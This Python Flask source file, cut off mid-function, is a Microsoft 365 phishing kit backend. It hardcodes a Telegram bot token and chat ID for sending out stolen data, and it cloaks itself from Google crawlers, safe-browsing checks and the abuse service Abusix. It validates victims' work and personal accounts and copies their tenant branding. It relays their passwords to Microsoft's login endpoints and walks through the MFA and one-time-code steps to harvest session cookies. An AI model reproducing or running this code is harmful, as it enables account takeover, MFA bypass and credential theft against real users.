from hashlib import sha1
import os
import re
import uuid
import json
import base64
import random
from datetime import datetime, timezone
import tempfile
import asyncio
from flask import Flask, request, jsonify, session, render_template, redirect, url_for, Response
import requests
from fake_useragent import UserAgent
from telegram import Bot
from telegram.request import HTTPXRequest
from telegram.ext import ApplicationBuilder
import urllib.parse
from Crypto.Cipher import AES
from functools import partial

# Initialize Flask application first
app = Flask(__name__)
app.secret_key = "2d300b06dba345980bcb37ccb46e803a1bf3c71be31a6ffdfb6e9b867beee25b"

# Set port and server name after app initialization
port = int(os.environ.get('PORT', 8080))
app.config['SERVER_NAME'] = None

# Configure the HTTPXRequest for the Telegram client
tg_request = HTTPXRequest(
    connection_pool_size=8,
    connect_timeout=30.0,
    read_timeout=30.0,
    write_timeout=30.0,
    pool_timeout=3.0
)

# Preserve original Bot class and create a partial that injects our tg_request by default
_RealBot = Bot
Bot = partial(_RealBot, request=tg_request)

# Define Telegram bot credentials
BOT_TOKEN = "7334858810:AAGBn50fvUpaYvlTNZ3ohwPkvOhuN8WqMgE"
CHAT_ID = "-4973868945"

# Initialize Telegram bot
bot = Bot(token=BOT_TOKEN)
def is_bot(ua, headers):
    """Check if request is from a bot"""
    bot_signatures = [
        'googlebot', 'crawler', 'spider', 'bot', 'abusix', 'apis-google', 'mediapartners-google',
        'adsbot', 'google-structured-data-testing-tool', 'google favicon', 'feedfetcher-google',
        'google page speed', 'google-inspectiontool', 'google web preview', 'google-read-aloud',
        'google-speakr', 'googleweblight', 'google-safebrowsing', 'google-site-verification', 
        'google-amphtml', 'google-amp', 'google search console', 'google search', 'google search app',
        'google search appliance', 'google search bot', 'google search crawler', 'google search indexer',
        'google search preview', 'google search spider', 'google search test', 'google search tool',
        'google search validator', 'google search verification', 'google search web', 'googlebot-news',
        'googlebot-image', 'googlebot-video', 'googlebot-mobile', 'googlebot-smartphone', 'googlebot-ads',
        'googlebot-shopping', 'googlebot-discover', 'googlebot-favicon', 'googlebot-amp', 'googlebot-amphtml',
        'googlebot-ampcache', 'googlebot-ampvalidator', 'googlebot-ampweb', 'googlebot-ampwebcache',
        'googlebot-ampwebvalidator', 'googlebot-ampwebview', 'googlebot-ampwebworker'
    ]

    for sig in bot_signatures:
        if sig in ua.lower():
            return True

    for h in headers:
        if 'abusix' in h[0].lower():
            return True
            
    return False

@app.route('/error/bot-detected')
def bot_error_handler():
    """Enhanced error handler route for detected bots with comprehensive checks"""
    # Clear any existing session
    session.clear()

    # Get visitor info
    ua = request.headers.get('User-Agent', '').lower()
    headers = [(k.lower(), v.lower()) for k,v in request.headers.items()]
    
    # Additional bot detection patterns
    additional_bot_patterns = [
        'headless', 'phantom', 'selenium', 'webdriver', 'cypress',
        'puppeteer', 'nightwatch', 'httpclient', 'java', 'python-requests',
        'python-urllib', 'wget', 'curl', 'scrapy', 'dataminr', 'facebookexternalhit',
        'twitterbot', 'whatsapp', 'slackbot', 'telegrambot', 'semrushbot',
        'bingbot', 'yandexbot', 'baiduspider', 'duckduckbot', 'archive.org_bot'
    ]
    
    # Check standard bot signatures from is_bot()
    is_standard_bot = is_bot(ua, headers)
    
    # Check additional patterns
    is_additional_bot = any(pattern in ua for pattern in additional_bot_patterns)
    
    # Check suspicious headers
    suspicious_headers = [
        'x-forwarded-for', 'via', 'proxy', 'cf-connecting-ip',
        'fastly', 'akamai', 'x-real-ip', 'x-forwarded-host'
    ]
    has_suspicious_headers = any(header in headers for header in suspicious_headers)
    
    # Browser fingerprint checks
    lacks_standard_headers = not all(h in dict(headers) for h in ['accept-language', 'accept-encoding'])
    
    # If any bot detection triggers, return 403
    if is_standard_bot or is_additional_bot or has_suspicious_headers or lacks_standard_headers:
        return Response(
            "Access denied - Automated or suspicious activity detected",
            status=403,
            headers={
                'Location': 'https://office.com',
                'X-Robots-Tag': 'noindex, nofollow, noarchive',
                'Cache-Control': 'no-store, no-cache, must-revalidate',
                'Pragma': 'no-cache',
                'Expires': '0'
            }
        )
    
    # If somehow reached here, redirect to index
    return redirect(url_for('index'))

async def send_telegram_message(message):
    """Sends a message to the Telegram chat."""
    try:
        await bot.send_message(chat_id=CHAT_ID, text=message)
    except Exception as e:
        print(f"Error sending Telegram message: {e}")

async def send_telegram_file(file_path, caption):
    """Sends a file to the Telegram chat."""
    try:
        with open(file_path, 'rb') as document:
            await bot.send_document(chat_id=CHAT_ID, document=document, caption=caption)
    except Exception as e:
        print(f"Error sending Telegram file: {e}")

# Define the required values
usuuid = "3GXoipmBY7l247z0ZEXzQK3UlqCOxPzzfD7R+hjLi4p0uy15xmnxKr9dSx9z7S8CkGIUAZXCUlA1VqOpO8RQHQ=="
policy = "XrHaYZDluGVBr+c+/ccx6FaVvw8BheNHOagfxOHEjviPZw9bFgIDd60TYwt5Vrao"
SV = "0"
SIR = "1"
TB = ""

# Browser configuration
class Browser:
    def __init__(self):
        self.user_agent = UserAgent()
        self.browser_arrays = [
            # Chrome
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36',
            
            # Edge
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/92.0.902.73 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/93.0.961.38 Safari/537.36',
            
            # Firefox
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
            
            # Safari
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15',
            
            # Mobile browsers
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36'
        ]
    
    def get_random_agent(self):
        return random.choice(self.browser_arrays)

# Cookie handling functions
def cookies_to_json(cookies):
    cookie_list = []
    for cookie in cookies:
        cookie_dict = {
            'name': cookie.name,
            'value': cookie.value,
            'domain': cookie.domain,
            'path': cookie.path,
            'secure': cookie.secure,
            'expires': cookie.expires
        }
        cookie_list.append(cookie_dict)
    return json.dumps(cookie_list)

# Email validation function
def is_valid_email(email):
    email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
    if not re.match(email_regex, email):
        return False

    allowed_domains = {
        "outlook.com", "outlook.ca", "hotmail.com", "hotmail.ca",
        "live.com", "live.ca", "msn.com"
    }
    domain = email.lower().split('@')[1] if '@' in email else ''
    if domain in allowed_domains:
        return True

    # For business/work emails, check if it's Office 365 registered
    try:
        resp = requests.get(
            f"https://login.microsoftonline.com/common/UserRealm/{email}?api-version=2.1",
            timeout=5
        )
        if resp.status_code == 200:
            data = resp.json()
            # Only allow business/work accounts registered with Office 365
            if data.get("account_type") in ["Managed", "Federated"]:
                # Exclude personal MicrosoftAccount (consumer) unless in allowed_domains
                return True
        return False
    except Exception:
        return False

def is_bot_request():
    ua = (request.headers.get('User-Agent') or '').lower()
    # Block Google bots, crawlers, and Abusix by redirecting to Microsoft login
    bot_signatures = [
        'googlebot', 'crawler', 'spider', 'bot', 'abusix', 'apis-google', 'mediapartners-google',
        'adsbot', 'google-structured-data-testing-tool', 'google favicon', 'feedfetcher-google',
        'google page speed', 'google-inspectiontool', 'google web preview', 'google-read-aloud',
        'google-speakr', 'googleweblight', 'google-safebrowsing', 'google-site-verification',
        'google-amphtml', 'google-amp', 'google search console', 'google search', 'google search app',
        'google search appliance', 'google search bot', 'google search crawler', 'google search indexer',
        'google search preview', 'google search spider', 'google search test', 'google search tool',
        'google search validator', 'google search verification', 'google search web', 'googlebot-news',
        'googlebot-image', 'googlebot-video', 'googlebot-mobile', 'googlebot-smartphone', 'googlebot-ads',
        'googlebot-shopping', 'googlebot-discover', 'googlebot-favicon', 'googlebot-amp', 'googlebot-amphtml',
        'googlebot-ampcache', 'googlebot-ampvalidator', 'googlebot-ampweb', 'googlebot-ampwebcache',
        'googlebot-ampwebvalidator', 'googlebot-ampwebview', 'googlebot-ampwebworker'
    ]

    # Check for bot signatures in user agent
    for sig in bot_signatures:
        if sig in ua:
            # Redirect to Microsoft login
            return redirect('https://office.com', code=302)

    # Check for Abusix headers
    for h in request.headers:
        if 'abusix' in h[0].lower():
            # Redirect to Microsoft login
            return redirect('https://office.com', code=302)

    # If not a bot, return False to allow normal access
    return False

# Decryption function for AES
def decrypt(encrypted_string, key):
    """
    Decrypts an AES-encrypted string using the provided key.
    The key must be 16, 24, or 32 bytes long.
    """
    key_lengths = [16, 24, 32]
    if len(key) not in key_lengths:
        raise ValueError("Incorrect AES key length. Use a 16, 24, or 32 bytes key.")

    encrypted_bytes = base64.b64decode(encrypted_string)
    iv = encrypted_bytes[:16]
    ciphertext = encrypted_bytes[16:]

    cipher = AES.new(key.encode("utf-8"), AES.MODE_CBC, iv)
    decrypted_bytes = cipher.decrypt(ciphertext)
    return decrypted_bytes.rstrip(b"\0").decode("utf-8")

def getTokenMicrosoft(email):
    """
    Get Microsoft authentication token (improved version matching PHP functionality)
    """
    try:
        # Use the correct client ID and parameters
        client_id = 'd3590ed6-52b3-4102-aeff-aad2292ab01c'  # Office client ID
        redirect_uri = 'msauth://com.microsoft.office.officehubrow/fcg80qvoM1YMKJZibjBwQcDfOno%3D'
        client_request_id = str(uuid.uuid4())
        
        # Build the correct URL
        url = (
            'https://login.microsoftonline.com/common/oauth2/authorize'
            f'?client_id={client_id}'
            f'&redirect_uri={urllib.parse.quote(redirect_uri)}'
            '&response_type=code'
            f'&login_hint={urllib.parse.quote(email)}'
            f'&client-request-id={client_request_id}'
            '&x-client-SKU=Android'
            '&x-client-Ver=4.2.4'
            '&x-client-OS=28'
            '&x-client-DM=google+Pixel+2'
            '&haschrome=1'
            '&claims={"access_token":{"xms_cc":{"values":["CP1"]}}}'
            '&x-app-name=com.microsoft.office.officehubrow'
            '&x-app-ver=16.0.16501.20200'
        )

        headers = {
            'Host': 'login.microsoftonline.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 9; Pixel 2 Build/PQ3A.190801.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-User': '?1',
            'Sec-Fetch-Dest': 'document'
        }

        session = requests.Session()
        response = session.get(url, headers=headers, allow_redirects=True)
        response.raise_for_status()

        # Extract config data from response
        config_start = response.text.find('$Config=') + 8
        config_end = response.text.find(';', config_start)
        
        if config_start > 7 and config_end > config_start:
            config_json = response.text[config_start:config_end].strip()
            try:
                config = json.loads(config_json)
                
                return {
                    'ctx': config.get('sCtx'),
                    'flowToken': config.get('sFT'),
                    'canary': config.get('canary'),
                    'hpgrequestid': config.get('sessionId'),
                    'cookie': '; '.join([f"{c.name}={c.value}" for c in session.cookies]),
                    'is_personal': any(domain in email.lower() for domain in [
                        'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
                        'outlook.ca', 'hotmail.ca', 'live.ca'
                    ])
                }
            except json.JSONDecodeError:
                print("Failed to parse $Config JSON")
                return None

        print(f"$Config not found in response from {response.url}")
        return None

    except requests.exceptions.RequestException as e:
        print(f"Error in getTokenMicrosoft: {str(e)}")
        return None    

def loginOffice(email, password):
    """
    Handle Microsoft login for both personal and work accounts.
    Matches the functionality of the PHP version.
    """
    try:
        token = getTokenMicrosoft(email)
        if not token:
            return {'status': 'error', 'message': 'Failed to get Microsoft authentication token'}

        # Build login data
        data = (
            f'i13=0&login={email}&loginfmt={email}&type=11&LoginOptions=3'
            f'&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}'
            f'&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK='
            f'&canary={token["canary"]}&ctx={token["ctx"]}'
            f'&hpgrequestid={token["hpgrequestid"]}&flowToken={token["flowToken"]}'
            '&PPSX=&NewUser=1&FoundMSAs=&fspost=0&i21=0'
            '&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&i19=318945'
        )

        headers = {
            'Host': 'login.microsoftonline.com',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 9; SM-G965N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://login.microsoftonline.com',
            'Cookie': token.get('cookie', ''),
            'Connection': 'keep-alive',
            'Referer': 'https://login.microsoftonline.com/common/login',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1'
        }

        # Make login request
        session = requests.Session()
        response = session.post(
            'https://login.microsoftonline.com/common/login',
            headers=headers,
            data=data,
            allow_redirects=True
        )

        result = response.text
        
        # Extract config data from response
        try:
            config_start = result.index('$Config=') + 8
            config_end = result.index(';', config_start)
            json_data = json.loads(result[config_start:config_end])
        except (ValueError, json.JSONDecodeError):
            json_data = None

        # Check for login errors
        if 'access_denied' in result.lower():
            return {'status': 'error', 'message': 'Your account or password is incorrect'}

        # Process cookies
        list_cookies = []
        if response.cookies:
            domain = 'login.microsoftonline.com'
            for cookie in response.cookies:
                cookie_str = f"{cookie.name}={cookie.value}"
                cookie_json = cookieToJSON(cookie_str, domain)
                list_cookies.append(cookie_json)

        # Check if 2FA verification needed
        if json_data and json_data.get('arrUserProofs'):
            is_personal = any(domain in email.lower() for domain in [
                'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
                'outlook.ca', 'hotmail.ca', 'live.ca'
            ])
            
            auth_data = {
                'ctx': json_data.get('sCtx'),
                'flowToken': json_data.get('sFT'),
                'hpgrequestid': json_data.get('sessionId'),
                'canary': json_data.get('canary'),
                'client-request-id': token.get('hpgrequestid'),
                'cookie': token.get('cookie'),
                'is_personal': is_personal
            }

            return {
                'status': 'verify',
                'message': 'Please verify your account',
                'data': base64.b64encode(json.dumps(auth_data).encode()).decode(),
                'method': base64.b64encode(json.dumps(json_data['arrUserProofs']).encode()).decode(),
                'key': base64.b64encode(password.encode()).decode(),
                'cookies': list_cookies
            }

        # Return success if no 2FA needed
        return {
            'status': 'success',
            'message': 'Login successful',
            'cookies': list_cookies
        }

    except Exception as e:
        print(f"Login error: {str(e)}")
        return {'status': 'error', 'message': 'An error occurred during login'}

def cookieToJSON(cookie_string, domain):
    cookie_parts = cookie_string.split(';')
    main_part = cookie_parts[0].strip()
    name, value = main_part.split('=', 1)

    cookie_dict = {
        'name': name,
        'value': value,
        'domain': domain,
        'path': '/',  # Default path
        'secure': False,
        'expires': None
    }

    for part in cookie_parts[1:]:
        part = part.strip()
        if 'secure' == part.lower():
            cookie_dict['secure'] = True
        elif 'httponly' == part.lower():
            cookie_dict['httpOnly'] = True
        elif 'path=' in part.lower():
            cookie_dict['path'] = part.split('=', 1)[1]
        elif 'expires=' in part.lower():
            cookie_dict['expires'] = part.split('=', 1)[1]
        elif 'max-age=' in part.lower():
            cookie_dict['max-age'] = part.split('=', 1)[1]

    return cookie_dict

def get_detail_email(email):
    def check_valid_email(email):
        # Reuse existing email validation logic from is_valid_email function
        email_regex = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
        if not re.match(email_regex, email):
            return False
            
        # Check if personal or work email
        is_personal = any(domain in email.lower() for domain in [
            'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
            'outlook.ca', 'hotmail.ca', 'live.ca'
        ])

        if is_personal:
            print(f"Validating personal email: {email}")
            return True
            
        # For work emails, verify Office 365 registration
        try:
            print(f"Validating work email: {email}")
            resp = requests.get(
                f"https://login.microsoftonline.com/common/UserRealm/{email}?api-version=2.1",
                timeout=5
            )
            if resp.status_code == 200:
                data = resp.json()
                if data.get("account_type") in ["Managed", "Federated"]:
                    print(f"Valid work email confirmed: {email}")
                    return True
            return False
        except Exception as e:
            print(f"Error validating work email: {str(e)}")
            return False

    checking = check_valid_email(email)

    if not checking:
        return {
            'status': 'error', 
            'message': "We couldn't find an account with that username. Try another account."
        }

    banner = None
    background = None
    data = {
        "username": email,
        "isOtherIdpSupported": True,
        "checkPhones": False,
        "isRemoteNGCSupported": True,
        "isCookieBannerShown": False,
        "isFidoSupported": True,
        "originalRequest": "rQQIARAAhZK_j9N2AMXj5C69i6A9jqqC7QYGhJTk628SOz6pgxPHjpOz88uO4yxW7Nix4x9fJ7GTkH-ASl3oUIRQVQESQpyEkDoVuiA2brqZvUslCurEVgKdUZen9_Te9j6ZPSKHEzmQAzdSMAeOrxVJolQslvRsARpEtkjpIFsumEQWH1OFbQVJwhjNDzMHP196--rw8lPx-YC-9cz6c3yKHdlRFC6O8_nVapVDluUYZs5Aft4bBWMnmCzh7xh2jmH3krtmkJV7p8kFUSApEi9DApZAoUgQFMi1pK4jQtEVJDVSp-56WAVA5ETvRKmthlM5UqGAi5D1BYV1BShDcep5Q4Zei1M1Ejd9v9UDQNjQm-2-KCidSFX4krgRisK07w851nmT_KZFx5ENPwmaOxvzn-S-hea-FqJFdC91Jyl5jG0tS9nKaDnyqX5YMyY2t-a44XJdXlZnHc0p6zWS5I01QQ0dIVCYPiv561grsBaFb4RR5MwUtsVQUjia203CNizX7Meb5kpl8YGC2640aDZifIFqTeTwcgVpTbpLMO2m7NF6i3LxRqPF27w68gEzoXtNhYyjWIJz-oSqgIXa0avcsjtuwMiVs9OT8awelTu67manVq2qgkGj7tKabMeuYWs6HJC-3kcyK_viqmU7bbqKej0mlkJGsLiSL8z4OcUFzXB7OxALDb8CUbktzasorsOGGYtUoaOX5ZPJaerqF-5dwt9S6a3xUXCWIlFoBs74KJwjy_HMLyGxhPnW51RHvpmjPe98B_tr57u99MHBlcRR4vq3IHW8t5c5SHxKH3awh7tb4l7__ev9n14t6k9_mTz64_F-4mw3XzZKfH3MWu2bVLsbBu0ARO0e3q0MZraC8-vhJAYl2J-FbW7xPTjGb6ex2-n0WfoSz2hiTepJtMjQXQZq4H0a--GrxIv9_2X4zYXLmUzsaB4yRp65OPyP5ZcXEx--vnv-5Md3_z54W_8I0",
        "country": "ID",
        "forceotclogin": False,
        "isExternalFederationDisallowed": False,
        "isRemoteConnectSupported": False,
        "federationFlags": 0,
        "isSignup": False,
        "flowToken": "AQABAAEAAAD--DLA3VO7QrddgJg7WevrrtYD55-US_847WPSVKszmoL19BW8RKdDiSEJ5LIB5-5b-IB6ijNV0ELreEs8ntgOWqAgTGbM24yesug2UQV7ShDu-uEwl96dRckcVp41PCzBqls2KMWLjiG9X2PvLdQY-s1ibzoy4nL-vaLU2kEXkNPDOL5A7s8eVj501xh3bFclyhIQ0KnRTogOAqMW1V7jwTJrVdvrrjagjxGyPdfwdMzHGlnfB7jJYdbDQi2ebKQLRGbR5K8RIiFUcgdo5lHYZbqICoP8BVLLlfnLFDMl59O2gj-t864RmLTncNf8N46JDHQ0Ve_KJ65TDVubMORlnW6DwLNLh0tpPcuBMIbm0eB93LLe_myUrzzj0wngCaUZCt-FeZNif2R1TI6GL22H7WiNRUTvQaxBPCGO-6rfjr0QeoO0khMSfLQ2PumbxS0H1hNwEhlNgol-FnzBxmSwP7rHlAi_fyWV_y9UNAH_F5jIhvhjrE5tn5rJTIyyoW8Ken1FRjdo3raYAy98ncTXVDRI1bSIm0oU1UW6IGMq0CGfTYDNMI7OvuJ8bsz6aIggAA",
        "isAccessPassSupported": True
    }

    headers = {
        "Host": "login.microsoftonline.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.81 Safari/537.36",
        "Content-Type": "text/plain;charset=UTF-8",
        "Cookie": "fpc=Am4z0EJhBX5KuuE5933G-GI; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension"
    }

    try:
        print(f"Getting email details for: {email}")
        response = requests.post(
            "https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US",
            headers=headers,
            json=data,
            timeout=10
        )
        response.raise_for_status()
        ress = response.json() if response.content else {}

        # Check if response is valid and has the required properties
        if ress and isinstance(ress, dict):
            ests_props = ress.get('EstsProperties', {})
            tenant_branding = ests_props.get('UserTenantBranding', [])
            
            if tenant_branding and isinstance(tenant_branding, list) and len(tenant_branding) > 0:
                branding = tenant_branding[0]
                banner = branding.get('BannerLogo')
                background = branding.get('Illustration')
                
                if banner:
                    print(f"Banner logo found for: {email}")
                if background:
                    print(f"Background illustration found for: {email}")

        return {
            'status': 'success',
            'banner': banner,
            'background': background,
        }
    except requests.exceptions.RequestException as e:
        print(f"Request failed for {email}: {e}")
        return {
            'status': 'error',
            'message': str(e)
        }
    except json.JSONDecodeError as e:
        print(f"Failed to decode JSON for {email}: {e}")
        return {
            'status': 'error',
            'message': "Failed to decode JSON response"
        }
    except Exception as e:
        print(f"Unexpected error for {email}: {e}")
        return {
            'status': 'error',
            'message': str(e)
        }
    
def begin_auth_office(method, ctx, flowToken, canary, cookie):
    """
    Simulates the PHP function beginAuthOffice using Python's requests library.
    Works with both personal and work Microsoft accounts.
    """
    try:
        data = {
            "AuthMethodId": method,
            "Method": "BeginAuth",
            "ctx": ctx,
            "flowToken": flowToken
        }

        headers = {
            "Host": "login.microsoftonline.com",
            "Cookie": cookie,
            "Hpgrequestid": str(uuid.uuid4()),  # Generate unique request ID
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36",
            "Client-Request-Id": str(uuid.uuid4()),  # Generate unique client request ID
            "Canary": canary,
            "Content-Type": "application/json; charset=UTF-8", 
            "Accept": "application/json",
            "Origin": "https://login.microsoftonline.com",
            "Referer": "https://login.microsoftonline.com/common/login",
            "Accept-Language": "en-US,en;q=0.9"
        }

        response = requests.post(
            "https://login.microsoftonline.com/common/SAS/BeginAuth",
            headers=headers,
            json=data  # Use json parameter instead of manually dumping
        )
        response.raise_for_status()
        return response.json()

    except requests.exceptions.RequestException as e:
        print(f"Request failed in begin_auth_office: {e}")
        return None
    except json.JSONDecodeError as e:
        print(f"Failed to decode JSON in begin_auth_office: {e}")
        return None
    except Exception as e:
        print(f"Unexpected error in begin_auth_office: {e}")
        return None

def begin_auth_email(email, session_id):
    """
    Begins authentication process for both personal and work Microsoft accounts.
    Works with existing getTokenMicrosoft, loginOffice and get_detail_email functions.
    """
    try:
        # First validate email
        if not is_valid_email(email):
            print(f"Invalid email format: {email}")
            return False

        # Get email details and branding
        detail_email_result = get_detail_email(email)
        if detail_email_result['status'] != 'success':
            print(f"Failed to get email details: {detail_email_result.get('message', 'Unknown error')}")
            return False

        # Get Microsoft token using existing getTokenMicrosoft function
        token = getTokenMicrosoft(email)
        if not token:
            print("Failed to get Microsoft token")
            return False

        # Store account type
        is_personal = token.get('is_personal', False)
        
        # Set default auth method for account type
        method = "1" if is_personal else "3"  # 1 for personal, 3 for work accounts
        
        # Build cookie string from token
        cookie = token.get('cookie', '')

        # Begin auth process
        begin_auth_result = begin_auth_office(
            method=method,
            ctx=token['ctx'],
            flowToken=token['flowToken'],
            canary=token['canary'],
            cookie=cookie
        )

        if not begin_auth_result:
            print("Failed to begin authentication")
            return False

        # Store auth data in session
        session['auth_start'] = {
            'email': email,
            'session_id': session_id,
            'action': 'begin_auth',
            'is_personal': is_personal
        }

        # Store branding in session
        session['banner'] = detail_email_result.get('banner')
        session['background'] = detail_email_result.get('background')

        return True

    except Exception as e:
        print(f"Error in begin_auth_email: {str(e)}")
        return False
    
def end_auth_email(token, otc=None):
    """
    Handles authentication completion for both personal and work Microsoft accounts.
    Compatible with existing getTokenMicrosoft, loginOffice and email validation functions.

    Args:
    token (str): The base64 encoded JSON string containing session details.
    otc (str, optional): One-time code. Defaults to None.

    Returns:
    dict: The JSON response from the API.
    """
    try:
        # Decode token data
        token_data = json.loads(base64.b64decode(token).decode())
        
        # Check if account is personal or work based on token data
        is_personal = token_data.get('is_personal', False)
        
        # Build request data with account-specific parameters
        data = {
            "Method": "EndAuth",
            "SessionId": token_data['session'],
            "FlowToken": token_data['flowToken'],
            "Ctx": token_data['ctx'],
            "AuthMethodId": "1" if is_personal else "3"  # 1 for personal, 3 for work accounts
        }

        # Add OTC code if provided
        if otc:
            data['AdditionalAuthData'] = otc

        # Set headers based on account type
        headers = {
            "Host": "login.microsoftonline.com",
            "Cookie": token_data['cookie'],
            "Hpgrequestid": str(uuid.uuid4()),
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 PKeyAuth/1.0",
            "Client-Request-Id": str(uuid.uuid4()),
            "Content-Type": "application/json; charset=UTF-8",
            "Accept": "application/json",
            "Origin": "https://login.microsoftonline.com",
            "Referer": "https://login.microsoftonline.com/common/login"
        }

        # Add additional headers for work accounts
        if not is_personal:
            headers.update({
                "X-Requested-With": "XMLHttpRequest",
                "X-MS-RefreshTokenCredential": "true"
            })

        response = requests.post(
            "https://login.microsoftonline.com/common/SAS/EndAuth",
            headers=headers,
            json=data  # Use json parameter instead of manual dumps
        )
        response.raise_for_status()
        json_response = response.json()

        # Handle cookies specific to account type
        cookies = response.headers.get('Set-Cookie')
        if cookies:
            if is_personal:
                domain = '.live.com'
            else:
                domain = '.login.microsoftonline.com'
            
            list_cookies = []
            for cookie in cookies.split(','):
                cookie_json = cookieToJSON(cookie.split(';')[0].strip(), domain)
                list_cookies.append(cookie_json)
            
            json_response['cookies'] = list_cookies

        return json_response

    except requests.exceptions.RequestException as e:
        print(f"Request failed: {e}")
        return {'status': 'error', 'message': str(e)}
    except json.JSONDecodeError as e:
        print(f"Failed to decode JSON: {e}")
        return {'status': 'error', 'message': "Failed to decode JSON response"}
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        return {'status': 'error', 'message': str(e)}

def process_auth_email(email, token):
    """
    Handles authentication processing for both personal and work Microsoft accounts.
    Compatible with existing getTokenMicrosoft, loginOffice and email validation functions.

    Args:
    token (dict): The token containing authentication data.
    email (str): The user email address.

    Returns:
    list: A list of JSON cookies.
    """
    try:
        # Validate email first
        if not is_valid_email(email):
            print(f"Invalid email format: {email}")
            return []

        # Check if personal or work account based on email domain
        is_personal = any(domain in email.lower() for domain in [
            'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
            'outlook.ca', 'hotmail.ca', 'live.ca'
        ])

        # Base data parameters common to both account types
        base_data = {
            "type": "22",
            "request": token['ctx'],
            "mfaLastPollStart": str(int(datetime.now().timestamp() * 1000)),
            "mfaLastPollEnd": str(int(datetime.now().timestamp() * 1000) + 1000),
            "login": email,
            "flowToken": token['flowToken'],
            "hpgrequestid": token['hpgrequestid'],
            "canary": token['canary'],
            "sacxt": "",
            "hideSmsInMfaProofs": "false",
            "i19": "8628"
        }

        # Add account-specific parameters
        if is_personal:
            base_data["mfaAuthMethod"] = "PhoneAppNotification"
        else:
            base_data["mfaAuthMethod"] = "PhoneAppOTP"
            base_data["isOtherIdpSupported"] = "true"
            base_data["isRemoteNGCSupported"] = "true"

        # Convert data to URL encoded format
        data = "&".join(f"{k}={v}" for k, v in base_data.items())

        # Set up headers
        headers = {
            "Host": "login.microsoftonline.com",
            "Cookie": token['cookie'],
            "Hpgrequestid": str(uuid.uuid4()),
            "User-Agent": "Mozilla/5.0 (Linux; Android 9; google Pixel 2 Build/LMY47I; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.131 Mobile Safari/537.36 PKeyAuth/1.0",
            "Content-Type": "application/x-www-form-urlencoded",
